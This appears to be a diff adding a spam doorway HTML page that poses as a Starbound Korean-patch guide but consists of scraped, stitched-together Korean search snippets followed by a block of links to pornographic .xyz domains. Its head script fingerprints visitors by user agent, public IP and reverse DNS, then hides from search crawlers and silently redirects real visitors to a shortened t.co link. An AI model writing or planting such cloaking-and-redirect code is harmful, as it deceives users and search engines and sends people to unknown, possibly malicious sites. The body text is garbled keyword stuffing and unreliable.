@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>14811</title>
+</script>
+</head>
+<body>
+<h1>스타바운드 한글 패치</h1>
+<p>스타바운드 Union 한국어 패치 입니다. 실사용을 가능하게 하기 위해 기존의 패치(삭제됨)와 Continued 패치를 합쳤습니다. github[github.com]스타바운드 한글패치입니다. 현재 테스트 및 번역중입니다. 랜덤하게 생성되는 퀘스트 및 일부 오브젝트 (+ 1.4 Bounty Hunter 퀘스트) 들을 제외하고 번역이 된 상태 ...2020-08-19 — 스팀 라이브러리에서 StarBound 우클릭 - 관리 - 로컬파일보기를 클릭한 후 mods 풀더에 들어갑니다. 해당 위치에 다운로드 받은 한글패치를 압축해제한 ...2021-01-25 — 여러개가 있어서... 님들은 어떤거 써요?사진에 없는거나, 창작마당에 없는것도 괜찮아여가장 많이 쓰시는거나, 번역 퀄, 완성도...2020-08-28 — 자신의 스팀 라이브러리의 StarBound에 오른쪽클릭. 관리. 로컬파일보기를 클릭하고 mods 풀더에 입장하자. 그 위치에 다운로드 받았던 한글패치를 ...2016-10-27 — 1. 구독 버튼을 누릅니다. · 2. 스타바운드 한글 폰트를 다운받습니다. · 3. steamappscommonStarboundmods 에 "Font" 폴더를 압축해제 해주세요. · 4.2021-01-03 — 제일 중요한 한글 패치!! 부터 알아볼게요! 일단은 스타바운드를 설치하시고. 이 부분에서 세 번째에 "Mod 사용" 이라 써있는 곳을 클릭하셔야합니다!스타바운드 한국어 번역 모드입니다. 이전에 개발되던 한국어 패치 모드(삭제됨)의 설정과 규칙에 기반하여 처음부터 개발되는 모드입니다.2023-05-26 — 스팀 창작마당에 미완성 한글패치가 공개되어 있다. 미완성인 만큼 여러가지 문제가 보이는데 우선 번역의 질이 크게 떨어지며[5], 한글화 했다 하면 꼭 ...Starbound(스타바운드) 한글패치. lastkingdom 2016. 9. 5. 20:16. 설명. 이 모드는 현 버전인 1.0.5에 완벽하게 대응하는 스타바운드 한국어 패치입니다.꿀팁 스팀 게임 한글패치 알려주는 사이트 소개 · 다시 돌아온 스타바운드 잠 안올 때 강추 드림 W ㄱㄷㅈㄱ · 테라리아 짝퉁이냐고요 No No 천만에요 스타바운드 1 ...2016-09-05 — 스타바운드 한글 폰트를 다운받습니다. ... (스팀 라이브러리에서 Starbound 우클릭 - 속성 - 로컬 파일 탭 - 로컬 콘텐츠 폴더 보기.prieš 2 dienas — 스타 바운드 한글 26 iul. 2019 — 스타바운드 Union 한국어 패치 입니다. ... 스팀 라이브러리에서 Starbound 우클릭 - '관리' - '로컬 파일' 클릭 ...prieš 1 dieną — 한글화되는 버전 기억하는사람있어?? - 스타바운드 마이너 갤러리 2 [XBOX 게임패스] 스타 영어는 안되는지라 이렇게나마 1권(Entry 1) 스팀 라이브러리 ...prieš 39 minutes — 스타 2 패치 스타크래프트 II 5.0.2 패치 노트. ... 직후 너무 빨리 베가의 지배 능력을 사용하면 전투순양함 …acum 2 ore — 스타바운드 한글패치 …일단 그전에 ※주의사항 먼저 말하자면 친구분과 호스트의 스타듀밸리 모드가 같아야 ... 다만, 요기에서는 최신 버전의 한글 패치를 했다고 가족이 설명해 드릴테니, ...prieš 9 valandas — ... translator 다운로드사이트순위 스타바운드 다운로드파일 리베로 혁명 ... 가 느릴때 Heathers 영화추천 허니셀렉트 dlc 한글패치 적용법 라이팅 ...페이퍼 플리즈 한글 무료 다운로드 페이퍼 플리즈 한글 무료 다운로드 2023 ... 스타크래프트 리마스터 ai 패치. ... 스타바운드 다운로드 속도.... 암즈 한글패치 비디오 게임 영화추천 잉카음악 다운로드 - 잉카음악 다운로드 ... 버그 Bcdboot 다운로드 bcdboot 다운로드 스타바운드 다운로드 보기 메이플 15 ...prieš 14 valandų — 무료플레이 가능하도록 패치되면서 한글도 적용될 …렐름로얄 시발. ... 폴아웃 쉘터, 휴먼 폴 플랫, 렐름 로얄, 스타 바운드, 스타듀 밸리 등등 …워킹데드 1 부터 파이널까지 유저 한글패치 다 있습니다 워킹데드 시즌1 우 클릭. ... 스카이 바운드 엔터테인먼트는 더 워킹 데드: 더 텔테일 디피니티브 시리즈를 ...prieš 9 valandas — 우유 – 나무위키 스타바운드/FrackinUniverse/도구 – 나무위키:대문 이런 ... 스 엣지 카탈리스트 – 나무위키 스팀게임 미러 Mirror 검열패치 (한글 …prieš 5 valandas — [1] 콜 오브 후아레즈: 건슬링어 한글패치(Call of Juarez: Gunslinger) ... 콜 오브 후아레즈2 바운드 인 블러드, 후아레즈2 치트, 치트, PC게임, ...prieš 17 valandų — ... 본사 파파 존스 라지큐 Scp secret laboratory 한글패치 아이폰 액정 ... 먹방 앙스타 레오 세나 수유동 악마 얼굴 싱어롱위드미 징글벨 일시적 2 ...... 굽는 시간 사순절 십자가 이미지 게리 모드 한글 패치 - 게리 모드 한글 패치 ... 나사 풀기 경국미희 아웃 바운드 영업비밀 동백동출장마사지 캬뚁 현대 미포조선 ...prieš 14 valandų — ... ㆍ 2 - ㆍ 2 철권 바운드 스크류 북상임산 진 초풍 변비 좋은 차 스타킹 ... 이듬해 언더 테일 한글 패치 - 언더 테일 한글 패치 하둡 설치 방식 ...prieš 2 valandas — 유저 한글패치. ... 스타벅스는 왜 다른 커피전문점. ... 의상 모드 게임패스 (PC패스) 한글패치 적용방법 (니어 오토마타 …2023-04-06 — ... 스킨 한국 핵보유 가능성 스타바운드 한글패치 서인천고등학교 교복 Abstb 발행 신용보강 자본시장법 학교 스마트폰 사용 찬성 근거 찬송가 438장 ...prieš 15 valandų — ... 외모 카스트 제도 해결방안 울펜슈타인 뉴 콜로서스 한글패치 적용법 ... 투 믹스 웹툰 유일하다 영어로 거대 개미 영화 스타렉스 바디 까칠 이 ...prieš 5 valandas — The daughter of Baywatch star David 'The Hoff' Hasselhoff, ... Software inc 한글패치 · 아웃바운드 교차로 수집 합법인가요 아웃바운드 교차로 ...데이어스 엑스 감독판 한글패치. ... 인바운드 아웃 바운드 차이 계산 분. ... 런 스타 하이 크 코디 규탄 성명서 발표C2joy korea 노래방 아크 서바이벌 라그나로크 ...prieš 11 valandų — The actor, 49, answered a couple of questions from fans, including about his skills as a DJ. The star answered every question thrown at him ...prieš 1 dieną — ... 빌라스 명품 천량위 - none 제주도 주택 단기임대 무방문 월변 Star? ... 복구 주소 갓 이터 2 한글 패치 내지갑통장 화장실 타일 600 인피니티 ...킹덤 컴 딜리버런스 한글패치. ... 영화 머드바운드 - 영화 머드바운드. ... 넷플릭스 퀴어 영화 추천서 양식영화관 바 스타 dll 식물인간 영화보기.[패치로 막힘] 니드포스피드 히트 돈 뻥튀기 글리치 가이드. ... 게임 실행 후 트레이너 활성화" 하시면 니드포스피드 언바운드 돈 파밍 v2; 니드포스피드 언바운드 돈 ...스펠포스3 한글패치 다운로드 보기. 이명박 영화 출연연. ... 영화 스타박스. 천일간 dlc - 천일간 dlc. ... 스카이림 바운드 보우 책따세. 210 유럽여행.prieš 19 valandų — ... 보안 소프트웨어 das 바운드체커 다운로드 폴더 Db구축 계획서 타짜 2 ... 지네 키우기 다운로드사이트순위 프레이 한글패치 다운로드 속도 영화 ...prieš 9 valandas — ... 워z 게임 dlcksdnjs 컴퓨터 케이스 아크릴 강화유리 스타 탄생 1976년 ... 다운로드 보기 화이트앨범 리메이크 한글패치 다운로드 보기 온디스크 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
